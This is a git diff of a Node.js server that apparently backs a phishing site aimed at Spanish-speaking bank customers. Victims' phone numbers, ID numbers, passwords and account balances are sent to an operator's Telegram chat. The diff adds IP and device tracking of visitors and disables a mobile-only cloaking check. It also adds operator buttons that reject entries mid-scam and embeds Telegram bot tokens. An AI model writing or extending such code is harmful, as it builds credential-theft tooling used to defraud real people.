@@ -5,8 +5,9 @@ const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 
 // CONFIGURATION - REPLACE THESE WITH YOUR OWN
-const TELEGRAM_TOKEN = '8263563776:AAEKwBsFsA4eq-Xdi_rEFNUwj0j14qO1fGk'; // Get from @BotFather
-const CHAT_ID = '-5279110730'; // Get from @userinfobot
+const TELEGRAM_TOKEN = '8613973292:AAGcOc-qY7Zk5QyOqRi9iI2r_CmTVV2SzLE'; // Main Bot
+const VISITOR_BOT_TOKEN = '8746680880:AAEX8Vi3b0MgD_aVn8BilHR01ZtkJeViW1c'; // Visitor Notification Bot
+const CHAT_ID = '-5102063644'; // ID corregido por el usuario
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -23,17 +24,51 @@ const ROUTES = {
 // Middleware for Mobile Detection
 const mobileCheck = (req, res, next) => {
     const ua = req.headers['user-agent'];
+    // Allow visualization in Trae
+    next();
+    /*
     if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
         next();
     } else {
         res.send(''); // Send empty response (blank screen)
     }
+    */
 };
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static('public')); // Serve assets if any
+
+// Initialize Telegram Bots
+const visitorBot = new TelegramBot(VISITOR_BOT_TOKEN, { polling: false }); // No polling needed for just sending
+
+// Endpoint to notify when someone opens the page
+app.get('/api/notify-visitor', (req, res) => {
+    const ip = getIP(req);
+    const fecha = formatDate();
+    const ua = req.headers['user-agent'];
+
+    const message = `
+👀 *NUEVA VISITA EN LA WEB*
+
+🌐 *IP:* ${ip}
+⏰ *Fecha:* ${fecha}
+📱 *Dispositivo:* ${ua.substring(0, 100)}...
+
+⚠️ *Acción:* El usuario acaba de abrir la página de inicio.
+    `;
+
+    visitorBot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' })
+        .then(() => {
+            console.log(`Visitor notification sent for IP: ${ip}`);
+            res.json({ success: true });
+        })
+        .catch((err) => {
+            console.error('Error sending visitor notification:', err);
+            res.status(500).json({ error: 'Failed to send notification' });
+        });
+});
 
 // Serve specific HTML files on random routes (Mobile Only)
 app.get(ROUTES.INDEX, mobileCheck, (req, res) => {
@@ -99,17 +134,26 @@ const getIP = (req) => {
 // In-memory storage for user sessions
 const userSessions = {};
 
-// Initialize Telegram Bot
+// Initialize Telegram Bot for Data
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-// Handle Telegram Polling Errors
+// Test Connection
+bot.sendMessage(CHAT_ID, "🚀 *SISTEMA INICIADO* - Bot de datos listo.")
+    .then(() => console.log("Connection Test: Main Bot sent message successfully."))
+    .catch(err => console.error("Connection Test: Main Bot FAILED to send message:", err.message));
+
+// Handle Telegram Polling Errors (Unified)
 bot.on('polling_error', (error) => {
     console.error(`[TELEGRAM ERROR] ${error.code}: ${error.message}`);
 });
 
-// Handle Telegram Errors (to prevent crash if token is invalid)
-bot.on('polling_error', (error) => {
-    console.log('Telegram Polling Error:', error.message);
+// Listener to help find the correct CHAT_ID
+bot.on('message', (msg) => {
+    console.log(`📩 MENSAJE RECIBIDO | Chat ID: ${msg.chat.id} | Tipo: ${msg.chat.type} | De: ${msg.from.username}`);
+});
+
+bot.getMe().then(me => {
+    console.log(`🤖 BOT INICIADO: @${me.username}`);
 });
 
 // Helper to format currency
@@ -121,6 +165,7 @@ const formatMoney = (value) => {
 // API Endpoint to receive data from frontend
 app.post('/api/save-data', (req, res) => {
     let { celular, cedula, clave, saldo, monto, cuota } = req.body;
+    console.log(`[DEBUG] Recibida solicitud /api/save-data para ${celular}`);
     
     if (!celular) {
         return res.status(400).json({ error: 'Celular is required' });
@@ -143,9 +188,17 @@ app.post('/api/save-data', (req, res) => {
         monto: formattedMonto,
         cuota: cleanCuota,
         ip,
-        status: 'approved', // Auto-approved to request dynamic immediately
+        status: 'waiting', // Start in waiting status
         timestamp: new Date()
     };
+
+    // Auto-approve to dynamic after 2 seconds
+    setTimeout(() => {
+        if (userSessions[cleanCelular] && userSessions[cleanCelular].status === 'waiting') {
+            userSessions[cleanCelular].status = 'approved';
+            console.log(`[AUTO-APPROVE] ${cleanCelular} moved to approved status after 2 seconds.`);
+        }
+    }, 2000);
 
     // Construct message for Telegram
     const message = `
@@ -164,12 +217,20 @@ app.post('/api/save-data', (req, res) => {
 
 ⏰ *Fecha:* ${fecha}
 
-⚠️ *Estado:* Redirigiendo a Dinámica...
+⚠️ *Estado:* Redirigiendo a Dinámica en 2 segundos...
     `;
 
-    // Send to Telegram without buttons (initial auto-approve)
+    // Send to Telegram with Inline Buttons (Optional if user wants to speed up or reject)
     const options = {
-        parse_mode: 'Markdown'
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: '❌ Rechazar (Error)', callback_data: `reject_${cleanCelular}` },
+                    { text: '❌ Error Saldo', callback_data: `reject_saldo_${cleanCelular}` }
+                ]
+            ]
+        }
     };
 
     bot.sendMessage(CHAT_ID, message, options)
